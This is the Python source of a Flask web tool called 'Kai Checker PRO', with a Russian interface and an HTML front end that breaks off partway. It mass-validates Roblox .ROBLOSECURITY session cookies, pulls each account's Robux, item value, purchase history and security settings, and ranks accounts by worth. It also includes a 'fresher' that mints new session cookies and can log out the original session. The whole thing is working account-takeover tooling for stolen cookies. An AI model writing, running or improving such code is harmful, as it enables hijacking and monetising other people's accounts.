import os
import time
import logging
import re
import urllib3
import json
import io
import zipfile
import uuid
import asyncio
import aiohttp
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, send_from_directory, send_file, session

# ==========================================
# ИНИЦИАЛИЗАЦИЯ И НАСТРОЙКИ
# ==========================================
os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
os.makedirs("history", exist_ok=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("KaiChecker")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# БЛОК: ИЗОЛЯЦИЯ ПО СЕССИЯМ
# ==========================================
def get_user_session_id():
    if 'user_id' not in session:
        session['user_id'] = str(uuid.uuid4())
    return session['user_id']

def get_user_history_file(prefix):
    sid = get_user_session_id()
    return f"history/{prefix}_{sid}.json"

def get_user_download_dir():
    sid = get_user_session_id()
    user_dir = os.path.join("downloads", sid)
    os.makedirs(user_dir, exist_ok=True)
    return user_dir, sid

# ==========================================
# БЛОК: ИСТОРИЯ (ПЕРСОНАЛЬНАЯ)
# ==========================================
def load_history(fp):
    if not os.path.exists(fp): return []
    try:
        with open(fp, 'r', encoding='utf-8') as f: return json.load(f)
    except Exception: return []

def save_history(fp, data):
    try:
        with open(fp, 'w', encoding='utf-8') as f: json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception: pass

def add_checker_history(entry):
    fp = get_user_history_file("checker")
    h = load_history(fp)
    h.append({
        'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        'type': entry.get('type','single'),
        'total': entry.get('total',1),
        'valid': entry.get('valid',0),
        'usernames': entry.get('usernames', []),
        'results': entry.get('results', []),
        'full_reports': entry.get('full_reports', [])
    })
    if len(h) > 50: h = h[-50:]
    save_history(fp, h)

def add_fresher_history(entry):
    fp = get_user_history_file("fresher")
    h = load_history(fp)
    h.append({
        'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'),
        'mode': entry.get('mode','duplicate'),
        'refreshed_count': entry.get('refreshed_count',0),
        'usernames': entry.get('usernames', []),
        'cookies': entry.get('cookies', [])
    })
    if len(h) > 50: h = h[-50:]
    save_history(fp, h)

# ==========================================
# БЛОК: ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ И АНАЛИТИКА
# ==========================================
def extract_cookies_from_text(text):
    cookies = []
    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
    for match in re.findall(pattern, text):
        cookie = match.strip('",;\'\\')
        if cookie.startswith('.ROBLOSECURITY='): cookie = cookie[15:]
        if len(cookie) > 50: cookies.append(cookie)
    pattern2 = r'\.ROBLOSECURITY=(_\|WARNING[^\s;]+)'
    for match in re.findall(pattern2, text):
        cookie = match.strip('",;\'\\')
        if len(cookie) > 50 and cookie not in cookies: cookies.append(cookie)
    seen = set()
    unique = []
    for c in cookies:
        if c not in seen: seen.add(c); unique.append(c)
    return unique

# ==========================================
# АСИНХРОННЫЙ ДВИЖОК ПРОВЕРКИ (AIOHTTP)
# ==========================================
async def async_get_user_rap(http_session, user_id):
    try:
        url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?assetType=All&limit=100"
        async with http_session.get(url, timeout=10, ssl=False) as r:
            if r.status == 200:
                data = await r.json()
                items = data.get('data', [])
                val = sum(item.get('recentAveragePrice', 0) for item in items)
                return val if val > 0 else None
    except Exception: pass
    return None

async def async_get_user_playtime(http_session, user_id):
    try:
        url = f"https://screenshots.roblox.com/v1/users/{user_id}/play-time"
        async with http_session.get(url, timeout=10, ssl=False) as r:
            if r.status == 200:
                data = await r.json()
                seconds = data.get('totalPlayTimeSeconds', 0)
                if seconds > 0:
                    return round(seconds / 3600, 1)
    except Exception: pass
    return None

async def async_get_full_info(cookie, connector=None):
    info = {
        'status':'❌', 'Username':'?', 'UserID':'?', 'Robux':0, 'RAP': None, 'PlaytimeHours': None,
        'Created':'?', 'Country':'?', 'EmailSet':False, 'TwoFactorEnabled':False,
        'AccountPinEnabled':False, 'PhoneSet':False, 'SecurityStatus':'⚠️ НИЗКИЙ',
        'Cookie':cookie, 'PurchasedGamepasses':{}, 'CreditCardsCount':0,
        'IsPremium':False, 'DonationTotal':0
    }
    c = cookie.strip()
    if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
    
    headers = {
        'Cookie': f'.ROBLOSECURITY={c}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json'
    }

    async with aiohttp.ClientSession(headers=headers, connector=connector) as s:
        try:
            async with s.get('https://users.roblox.com/v1/users/authenticated', timeout=12, ssl=False) as r:
                if r.status != 200: return info
                d = await r.json()
                if 'id' not in d: return info
                info['UserID'] = d.get('id'); info['Username'] = d.get('name'); info['status'] = '✅'
                uid = info['UserID']

            async def safe_json(url):
                try:
                    async with s.get(url, timeout=8, ssl=False) as res:
                        return await res.json() if res.status == 200 else {}
                except Exception: return {}

            sd, pm, rd, rb, ct = await asyncio.gather(
                safe_json('https://www.roblox.com/my/settings/json'),
                safe_json(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions'),
                safe_json(f'https://users.roblox.com/v1/users/{uid}'),
                safe_json(f'https://economy.roblox.com/v1/users/{uid}/currency'),
                safe_json('https://users.roblox.com/v1/users/authenticated/country-code'),
                return_exceptions=True
            )

            if isinstance(sd, dict) and sd:
                sec = sd.get('MyAccountSecurityModel', {})
                info['EmailSet'] = sec.get('IsEmailSet', False)
                info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled', False)
                info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled', False)
                info['PhoneSet'] = sec.get('IsPhoneSet', False)

            if isinstance(pm, dict) and pm.get('isSubscribed'): 
                info['IsPremium'] = True

            if isinstance(rd, dict) and rd.get('created'):
                try:
                    dt = datetime.fromisoformat(rd.get('created','').replace('Z','+00:00'))
                    info['Created'] = dt.strftime('%d.%m.%Y')
                except Exception: pass

            if isinstance(rb, dict): 
                info['Robux'] = rb.get('robux', 0)

            if isinstance(ct, dict): 
                info['Country'] = ct.get('countryCode', '?')

            info['RAP'] = await async_get_user_rap(s, uid)
            info['PlaytimeHours'] = await async_get_user_playtime(s, uid)

            # Расчёт транзакций
            try:
                total = 0; gp_dict = {}; cursor = ""; page = 0
                while page < 3:
                    url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
                    if cursor: url += f"&cursor={cursor}"
                    async with s.get(url, timeout=8, ssl=False) as tr_res:
                        if tr_res.status != 200: break
                        data = await tr_res.json()
                        for item in data.get('data', []):
                            price = abs(item.get('currency',{}).get('amount',0)); total += price
                            if price >= 50:
                                nm = item.get('details',{}).get('name','Товар')
                                pn = item.get('details',{}).get('place',{}).get('name','Другие игры')
                                if pn not in gp_dict: gp_dict[pn] = []
                                gp_dict[pn].append({'name':nm,'price':price})
                        cursor = data.get('nextPageCursor')
                        if not cursor: break
                        page += 1
            except Exception: pass
            
            info['PurchasedGamepasses'] = gp_dict
            info['DonationTotal'] = total

            sc = 0
            if info['EmailSet']: sc += 1
            if info['TwoFactorEnabled']: sc += 2
            if info['AccountPinEnabled']: sc += 1
            if info['PhoneSet']: sc += 1
            info['SecurityStatus'] = '🔒 ВЫСОКИЙ' if sc >= 4 else ('🔐 СРЕДНИЙ' if sc >= 2 else '⚠️ НИЗКИЙ')

        except Exception as e:
            logger.error(f"Error checking cookie: {e}")
    return info

async def async_quick_validate(cookie, semaphore):
    async with semaphore:
        info = await async_get_full_info(cookie)
        result = {
            'status':'❌', 'username':'?', 'user_id':'?', 'robux':0, 'rap': None, 'playtime': None,
            'created':'?', 'is_premium':False, 'has_email':False, 'has_2fa':False,
            'cookie':cookie, 'score':0, 'full_info': None
        }
        if info['status'] == '✅':
            result['status'] = '✅'
            result['username'] = info['Username']
            result['user_id'] = info['UserID']
            result['robux'] = info['Robux']
            result['rap'] = info['RAP']
            result['playtime'] = info['PlaytimeHours']
            result['created'] = info['Created']
            result['is_premium'] = info['IsPremium']
            result['has_email'] = info['EmailSet']
            result['has_2fa'] = info['TwoFactorEnabled']
            result['full_info'] = info
            
            score = 0
            if info['Robux'] >= 10000: score += 100
            elif info['Robux'] >= 1000: score += 50
            elif info['Robux'] > 0: score += 10
            if info['RAP'] and info['RAP'] > 5000: score += 50
            if info['IsPremium']: score += 50
            if info['EmailSet']: score += 15
            if info['TwoFactorEnabled']: score += 10
            result['score'] = score
        return result

async def async_mass_check(cookies_list, max_concurrent=50):
    semaphore = asyncio.Semaphore(max_concurrent)
    tasks = [async_quick_validate(c, semaphore) for c in cookies_list]
    results = await asyncio.gather(*tasks)
    
    valid = [r for r in results if r['status']=='✅']
    invalid = [r for r in results if r['status']=='❌']
    valid.sort(key=lambda x: x['score'], reverse=True)
    return valid + invalid

# ==========================================
# ФОРМАТТЕРЫ ОТЧЕТОВ
# ==========================================
def format_full_report(info):
    if info['status'] != '✅': return f"❌ НЕВАЛИДНЫЙ КУК\n{info['Cookie']}"
    gp = info.get('PurchasedGamepasses',{})
    rap_str = f"⏣ {info['RAP']:,}" if info['RAP'] is not None else "❌"
    play_str = f"{info['PlaytimeHours']} ч." if info['PlaytimeHours'] is not None else "❌"
    
    r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']}\n"
    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💎 RAP: {rap_str} | ⏱️ Плейтайм: {play_str}\n"
    r += f"💸 Донат: ⏣ {info['DonationTotal']:,} | ⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔐 {info['SecurityStatus']}\n"
    r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
    if gp:
        r += "📦 ГЕЙМПАССЫ:\n"
        for game, passes in list(gp.items())[:3]:
            for p in passes[:5]: r += f"  {game} - {p['name']} ({p['price']} R$)\n"
    r += f"\n🍪 {info['Cookie']}"
    return r

def format_quick_report(result):
    if result['status'] == '✅':
        score = result.get('score',0)
        rank = "👑" if score>=150 else ("💎" if score>=100 else ("⭐" if score>=60 else "🟢"))
        badges = []
        if result.get('is_premium'): badges.append("💠")
        if result.get('has_2fa'): badges.append("🔐")
        rap_str = f"RAP: {result['rap']:,}" if result['rap'] is not None else "RAP: ❌"
        play_str = f"{result['playtime']}h" if result['playtime'] is not None else "⏱️ ❌"
        return f"{rank} {result['username']} [{result['user_id']}] | ⏣{result['robux']:,} ({rap_str}) | {play_str} | S:{score} {' '.join(badges)}"
    return f"❌ НЕВАЛИД"

# ==========================================
# АСИНХРОННЫЙ ФРЕШЕР СЕССИЙ
# ==========================================
async def async_refresh_roblox_cookie(cookie, kill_old=False):
    result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        cookies_dict = {'.ROBLOSECURITY': c}

        async with aiohttp.ClientSession(headers=headers, cookies=cookies_dict) as s:
            async with s.get('https://users.roblox.com/v1/users/authenticated', timeout=10, ssl=False) as check_r:
                if check_r.status != 200:
                    result['error'] = "Кук невалиден"; return result
                user_data = await check_r.json()
                result['username'] = user_data.get('name', '?')
                result['user_id'] = user_data.get('id', '?')

            async with s.post('https://auth.roblox.com/v2/logout', headers={'Content-Type': 'application/json'}, timeout=10, ssl=False) as csrf_r:
                csrf_token = csrf_r.headers.get('x-csrf-token')

            if not csrf_token:
                result['error'] = "CSRF токен не получен"; return result

            ticket_headers = {
                'RBXauthenticationNegotiation': '1',
                'referer': 'https://www.roblox.com/my/account',
                'X-CSRF-Token': csrf_token,
                'Content-Type': 'application/json'
            }
            async with s.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, json={}, timeout=10, ssl=False) as ticket_r:
                auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')

            if not auth_ticket:
                result['error'] = "Auth Ticket не найден"; return result

            redeem_headers = {
                'RBXauthenticationNegotiation': '1',
                'Content-Type': 'application/json'
            }
            async with s.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}, timeout=10, ssl=False) as redeem_r:
                new_cookie_value = None
                set_cookie_hdr = redeem_r.headers.get('Set-Cookie', '')
                if '.ROBLOSECURITY=' in set_cookie_hdr:
                    match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie_hdr)
                    if match: new_cookie_value = match.group(1)

                if not new_cookie_value:
                    for name, cookie_obj in s.cookie_jar.filter_cookies('https://www.roblox.com').items():
                        if name == '.ROBLOSECURITY' and cookie_obj.value:
                            new_cookie_value = cookie_obj.value
                            break

                if not new_cookie_value:
                    result['error'] = "Новый кук не перехвачен"; return result

                if kill_old:
                    try:
                        async with s.post('https://auth.roblox.com/v2/logout', headers={'X-CSRF-Token': csrf_token}, timeout=8, ssl=False):
                            pass
                    except Exception: pass

                # Проверка нового кука
                async with aiohttp.ClientSession(headers=headers, cookies={'.ROBLOSECURITY': new_cookie_value}) as test_s:
                    async with test_s.get('https://users.roblox.com/v1/users/authenticated', timeout=10, ssl=False) as test_r:
                        if test_r.status == 200:
                            result['new_cookie'] = new_cookie_value
                            result['success'] = True
                        else:
                            result['error'] = "Новый кук не прошёл валидацию"
    except Exception as e:
        result['error'] = str(e)
    return result

# ==========================================
# БЛОК: ИНСТРУМЕНТЫ (ФАЙЛЫ & ПРОКСИ)
# ==========================================
def merge_cookie_files(contents):
    all_cookies = []
    for c in contents:
        extracted = extract_cookies_from_text(c)
        all_cookies.extend(extracted)
    unique = list(dict.fromkeys(all_cookies))
    return '\n'.join(unique)

def remove_duplicates(content):
    cookies = extract_cookies_from_text(content)
    return '\n'.join(cookies)

async def async_validate_proxy(proxy_str):
    proxy = proxy_str.strip()
    if not proxy.startswith('http') and not proxy.startswith('socks'):
        proxy = 'http://' + proxy
    try:
        async with aiohttp.ClientSession() as session:
            start = time.time()
            async with session.get('https://users.roblox.com/v1/users/authenticated', proxy=proxy, timeout=5, ssl=False) as r:
                latency = round((time.time() - start) * 1000)
                return {'proxy': proxy_str, 'valid': True, 'latency': latency}
    except Exception:
        return {'proxy': proxy_str, 'valid': False, 'latency': 0}

# ==========================================
# FLASK APPLICATION & HTML INTERFACE
# ==========================================
app = Flask(__name__)
app.secret_key = os.urandom(24)

HTML = r"""<!DOCTYPE html>
<html lang="ru" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kai Checker PRO - Ultimate Edition</title>
    <link href="https://fonts.googleapis.com/css2?family=Rubik+Puddles&family=Paytone+One&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #07030d;
            --bg-card: rgba(23, 10, 38, 0.65);
            --border-card: rgba(168, 85, 247, 0.25);
            --border-hover: rgba(217, 70, 239, 0.6);
            --input-bg: rgba(12, 5, 20, 0.75);
            --text-main: #f3e8ff;
            --text-muted: #a78bfa;
            --accent-purple: #9333ea;
            --accent-pink: #c026d3;
            --accent-glow: rgba(168, 85, 247, 0.25);
            --gradient-primary: linear-gradient(135deg, #a855f7 0%, #d946ef 50%, #6366f1 100%);
            --gradient-btn: linear-gradient(135deg, #7e22ce 0%, #a855f7 100%);
            --gradient-btn-hover: linear-gradient(135deg, #9333ea 0%, #c026d3 100%);
        }
        [data-theme="light"] {
            --bg: #f5f0ff;
            --bg-card: rgba(255, 255, 255, 0.85);
            --border-card: rgba(168, 85, 247, 0.2);
            --border-hover: rgba(168, 85, 247, 0.5);
            --input-bg: rgba(243, 232, 255, 0.6);
            --text-main: #2e1065;
            --text-muted: #7e22ce;
            --accent-purple: #7e22ce;
            --accent-pink: #c026d3;
            --accent-glow: rgba(126, 34, 206, 0.15);
            --gradient-primary: linear-gradient(135deg, #7e22ce 0%, #c026d3 100%);
            --gradient-btn: linear-gradient(135deg, #7e22ce 0%, #a855f7 100%);
            --gradient-btn-hover: linear-gradient(135deg, #6b21a8 0%, #9333ea 100%);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            min-height: 100vh;
            background: var(--bg);
            color: var(--text-main);
            position: relative;
            overflow-x: hidden;
            padding: 24px 16px;
        }

        #particles-canvas {
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            z-index: 0;
            pointer-events: none;
        }
        .bg-glow {
            position: fixed;
            width: 500px; height: 500px;
            background: radial-gradient(circle, rgba(168, 85, 247, 0.12) 0%, rgba(0,0,0,0) 70%);
            top: -100px; left: 50%;
            transform: translateX(-50%);
            z-index: 0;
            pointer-events: none;
            animation: pulseGlow 8s infinite alternate ease-in-out;
        }
        @keyframes pulseGlow {
            0% { transform: translateX(-50%) scale(1); opacity: 0.5; }
            100% { transform: translateX(-50%) scale(1.2); opacity: 0.8; }
        }

        .wrapper {
            max-width: 1350px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
            background: var(--bg-card);
            border: 1px solid var(--border-card);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 28px;
            padding: 32px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.05);
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 24px;
            border-bottom: 1px solid var(--border-card);
            margin-bottom: 28px;
            flex-wrap: wrap;
            gap: 16px;
        }
        .logo-wrap { display: flex; align-items: center; gap: 14px; }

        .logo-text {
            font-family: 'Paytone One', 'Rubik Puddles', cursive, sans-serif;
            font-size: 38px;
            font-weight: 900;
            letter-spacing: 1px;
            background: linear-gradient(135deg, #f472b6 0%, #d946ef 40%, #a855f7 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 15px rgba(217, 70, 239, 0.3);
            transform: skew(-4deg);
            display: inline-block;
        }
        .badge-pro {
            font-size: 11px; font-weight: 800;
            background: rgba(168, 85, 247, 0.15);
            color: var(--accent-pink);
            padding: 4px 12px; border-radius: 20px;
            border: 1px solid var(--border-card);
            letter-spacing: 1.5px;
        }

        .stats-bar { display: flex; gap: 12px; flex-wrap: wrap; }
        .stat-card {
            background: var(--input-bg);
            border: 1px solid var(--border-card);
            padding: 8px 16px; border-radius: 16px;
            display: flex; flex-direction: column; align-items: center; min-width: 90px;
        }
        .stat-val { font-size: 16px; font-weight: 800; color: var(--accent-pink); }
        .stat-lbl { font-size: 10px; color: var(--text-muted); font-weight: 600; text-transform: uppercase; }

        .tabs {
            display: flex; gap: 12px; margin-bottom: 32px;
            background: var(--input-bg);
            padding: 8px; border-radius: 22px;
            border: 1px solid var(--border-card);
            width: fit-content; flex-wrap: wrap;
            box-shadow: 0 8px 30px rgba(0,0,0,0.25);
        }
        .tab {
            padding: 14px 32px; border-radius: 16px;
            color: var(--text-muted); cursor: pointer;
            font-size: 15px; font-weight: 700;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            border: 1px solid transparent; background: transparent;
            display: flex; align-items: center; gap: 8px;
        }
        .tab:hover {
            color: var(--text-main);
            background: rgba(168, 85, 247, 0.1);
            border-color: rgba(168, 85, 247, 0.2);
            transform: translateY(-1px);
        }
        .tab.active {
            background: var(--gradient-btn);
            color: #fff;
            border-color: rgba(255, 255, 255, 0.15);
            box-shadow: 0 6px 18px var(--accent-glow);
            transform: translateY(-1px);
        }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        .card {
            background: var(--bg-card);
            border: 1px solid var(--border-card);
            border-radius: 20px; padding: 24px;
            margin-bottom: 20px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
        .card:hover {
            border-color: var(--border-hover);
            box-shadow: 0 10px 25px var(--accent-glow);
        }
        .card h2, .card h3 {
            font-size: 16px; font-weight: 800; margin-bottom: 16px;
            color: var(--text-main); display: flex; align-items: center; gap: 8px;
        }

        .btn {
            position: relative; overflow: hidden;
            padding: 12px 24px; border: none; border-radius: 14px;
            font-size: 13px; font-weight: 700; cursor: pointer;
            color: #fff; display: inline-flex; align-items: center;
            justify-content: center; gap: 8px; text-decoration: none;
            transition: all 0.25s; box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        }
        .btn-primary { background: var(--gradient-btn); }
        .btn-primary:hover { background: var(--gradient-btn-hover); box-shadow: 0 4px 15px var(--accent-glow); transform: translateY(-1px); }
        .btn-secondary { background: var(--input-bg); border: 1px solid var(--border-card); color: var(--text-muted); }
        .btn-secondary:hover { color: var(--text-main); border-color: var(--accent-purple); }
        .btn-danger { background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); color: #fca5a5; }
        .btn-danger:hover { background: rgba(239, 68, 68, 0.3); }
        .btn-sm { padding: 8px 16px; font-size: 12px; border-radius: 10px; }

        .fresher-mode-btn.active-mode {
            background: var(--gradient-btn) !important;
            color: #fff !important;
            border-color: var(--accent-pink) !important;
            box-shadow: 0 0 12px var(--accent-glow);
            transform: scale(1.02);
        }

        textarea, input[type="number"], input[type="text"] {
            width: 100%; padding: 14px;
            background: var(--input-bg);
            border: 1px solid var(--border-card);
            border-radius: 14px; color: var(--text-main);
            font-family: monospace; font-size: 12px;
            transition: border-color 0.2s;
        }
        textarea:focus, input:focus { border-color: var(--accent-pink); box-shadow: 0 0 8px var(--accent-glow); }

        .upload-area {
            min-height: 110px; border: 2px dashed var(--border-card);
            border-radius: 16px; background: var(--input-bg);
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; cursor: pointer; transition: all 0.25s; text-align: center;
            padding: 16px;
        }
        .upload-area:hover, .upload-area.drag-over {
            border-color: var(--accent-pink); background: rgba(168, 85, 247, 0.05);
            box-shadow: 0 0 10px var(--accent-glow);
        }

        .result-container { margin-top: 16px; position: relative; }
        .result-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; flex-wrap: wrap; gap: 8px; }
        .result-title { font-size: 12px; font-weight: 700; color: var(--text-muted); }

        .action-btn-group { display: flex; gap: 6px; align-items: center; }

        .btn-action-small {
            background: rgba(168, 85, 247, 0.15);
            border: 1px solid var(--border-card);
            color: var(--text-main);
            padding: 4px 12px; border-radius: 8px;
            font-size: 11px; font-weight: 600; cursor: pointer;
            transition: all 0.2s;
        }
        .btn-action-small:hover { background: rgba(168, 85, 247, 0.3); border-color: var(--accent-pink); }

        .result-box {
            background: var(--input-bg); border: 1px solid var(--border-card);
            border-radius: 14px; padding: 14px;
            max-height: 400px; overflow-y: auto; font-family: monospace;
            font-size: 12px; color: var(--text-main); white-space: pre-wrap; word-break: break-all;
            margin-top: 6px;
        }

        .progress-bar {
            margin-top: 12px; background: var(--input-bg);
            border-radius: 20px; height: 8px; overflow: hidden; border: 1px solid var(--border-card);
        }
        .progress-fill { height: 100%; width: 0%; background: var(--gradient-btn); transition: width 0.3s ease; }

        .checker-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        @media(max-width:900px){ .checker-grid { grid-template-columns: 1fr; } }

        .theme-btn {
            background: var(--input-bg); border: 1px solid var(--border-card);
            border-radius: 30px; padding: 8px 16px; cursor: pointer;
            font-size: 12px; color: var(--text-main); font-weight: 700; transition: all 0.2s;
        }
        .theme-btn:hover { border-color: var(--accent-purple); }

        .footer {
            text-align: center; padding-top: 20px; color: var(--text-muted);
            font-size: 12px; font-weight: 600; border-top: 1px solid var(--border-card); margin-top: 24px;
        }
        
        .history-card {
            background: var(--input-bg); border: 1px solid var(--border-card);
            border-radius: 16px; padding: 16px; margin-bottom: 14px;
        }
        .history-header {
            display: flex; justify-content: space-between; align-items: center;
            font-size: 13px; font-weight: 700; color: var(--accent-pink);
            flex-wrap: wrap; gap: 8px;
        }
        .history-users {
            font-size: 11px; color: var(--text-main); margin-top: 6px; font-weight: 600;
            display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
        }
        
        .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }

        /* TOAST UVIEDOMLENIYA */
        .custom-alert-overlay {
            position: fixed; top: 24px; right: 24px; z-index: 99999; pointer-events: none;
        }
        .custom-alert-card {
            pointer-events: auto; background: rgba(23, 10, 38, 0.95);
            border: 1px solid var(--border-hover);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 0 0 15px var(--accent-glow);
            backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
            border-radius: 16px; padding: 14px 20px;
            display: flex; align-items: center; gap: 12px; min-width: 280px; max-width: 360px;
            transform: translateY(-20px) scale(0.95); opacity: 0;
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .custom-alert-overlay.show .custom-alert-card { transform: translateY(0) scale(1); opacity: 1; }
        .alert-icon { font-size: 22px; line-height: 1; }
        .alert-body { display: flex; flex-direction: column; gap: 2px; flex-grow: 1; }
        .alert-body h3 { margin: 0; color: #fff; font-size: 13px; font-weight: 700; }
        .alert-body p { color: var(--text-muted); font-size: 12px; margin: 0; word-break: break-word; font-weight: 500; }
        .alert-close-btn { background: transparent; border: none; color: var(--text-muted); font-size: 16px; cursor: pointer; padding: 4px; line-height: 1; }

        .spinner {
            display: inline-block; width: 14px; height: 14px;
            border: 2px solid rgba(255,255,255,0.3); border-radius: 50%;
            border-top-color: #fff; animation: spin 0.8s ease-in-out infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
<canvas id="particles-canvas"></canvas>
<div class="bg-glow"></div>

<div id="custom-alert" class="custom-alert-overlay">
    <div class="custom-alert-card">
        <div class="alert-icon">⚡</div>
        <div class="alert-body">
            <h3>Уведомление</h3>
            <p id="custom-alert-msg">Вставьте кук!</p>
        </div>
        <button class="alert-close-btn" onclick="closeAlert()">✕</button>
    </div>
</div>

<div class="wrapper">
    <div class="header">
        <div class="logo-wrap">
            <div class="logo-text">KAI CHECKER</div>
            <span class="badge-pro">PRO AIO Edition</span>
        </div>
        <div class="stats-bar">
            <div class="stat-card"><span class="stat-val" id="statValid">0</span><span class="stat-lbl">Валид</span></div>
            <div class="stat-card"><span class="stat-val" id="statRobux">0</span><span class="stat-lbl">Robux</span></div>
            <div class="stat-card"><span class="stat-val" id="statPremium">0</span><span class="stat-lbl">Premium</span></div>
        </div>
        <button class="theme-btn" onclick="toggleTheme()">🌓 Тема</button>
    </div>

    <div class="tabs">
        <button class="tab active" data-tab="checker">🔍 Чекер</button>
        <button class="tab" data-tab="fresher">🔄 Фрешер</button>
        <button class="tab" data-tab="history">📋 История</button>
        <button class="tab" data-tab="tools">🧰 Инструменты</button>
    </div>

    <!-- ЧЕКЕР -->
    <div class="tab-content active" id="tab-checker">
        <div class="checker-grid">
            <div class="card">
                <h2>🔍 Одиночная проверка</h2>
                <textarea id="singleCookie" placeholder="Вставьте ОДИН .ROBLOSECURITY кук..." rows="5"></textarea>
                <div style="margin-top:12px;">
                    <button class="btn btn-primary" onclick="runSingleCheck()" style="width:100%;">Проверить (Ctrl+Enter)</button>
                </div>
                <div class="result-container" id="singleContainer" style="display:none;">
                    <div class="result-header">
                        <span class="result-title">РЕЗУЛЬТАТ:</span>
                        <div class="action-btn-group">
                            <button class="btn-action-small" onclick="copyBoxText('singleResult')">📋 Копировать</button>
                            <button class="btn-action-small" onclick="downloadTxtFromBox('singleResult', 'single_report.txt')">📥 TXT (Ctrl+S)</button>
                            <button class="btn-action-small" id="btnToggle_singleResult" onclick="toggleBox('singleResult')">▼</button>
                        </div>
                    </div>
                    <div class="result-box" id="singleResult"></div>
                </div>
            </div>

            <div class="card">
                <h2>📦 Массовая проверка (Async Aiohttp)</h2>
                <div class="upload-area" id="massDropArea" onclick="document.getElementById('massFile').click()">
                    <p style="font-weight:700;">📁 Перетащите TXT файл с куками</p>
                    <p style="font-size:11px;color:var(--text-muted);margin-top:4px;">или нажмите для выбора файла</p>
                </div>
                <input type="file" id="massFile" accept=".txt" style="display:none;">
                <div id="massFileInfo" style="font-size:12px;color:var(--accent-pink);margin-top:6px;font-weight:600;"></div>
                
                <div style="margin-top:12px;">
                    <button class="btn btn-primary" onclick="runMassCheck()" style="width:100%;">🚀 Запустить массовый чек</button>
                </div>
                <div class="progress-bar"><div class="progress-fill" id="massProgress"></div></div>
                
                <div class="result-container" id="massContainer" style="display:none;">
                    <div class="result-header">
                        <span class="result-title">РЕЗУЛЬТАТЫ:</span>
                        <div class="action-btn-group">
                            <button class="btn-action-small" onclick="copyBoxText('massResult')">📋 Копировать</button>
                            <button class="btn-action-small" onclick="downloadMassZip()">📦 ZIP Все</button>
                            <button class="btn-action-small" onclick="downloadTxtFromBox('massResult', 'mass_report.txt')">📥 TXT</button>
                            <button class="btn-action-small" id="btnToggle_massResult" onclick="toggleBox('massResult')">▼</button>
                        </div>
                    </div>
                    <div class="result-box" id="massResult"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- ФРЕШЕР -->
    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Обновление сессий (High-Speed Async)</h2>
            <div style="display:flex;gap:12px;margin-bottom:14px;align-items:center;">
                <span style="font-size:13px;font-weight:700;color:var(--text-muted);">Режим работы:</span>
                <button class="btn btn-secondary btn-sm fresher-mode-btn active-mode" id="btnDup" onclick="setFresherMode('duplicate')">♻️ Дублировать</button>
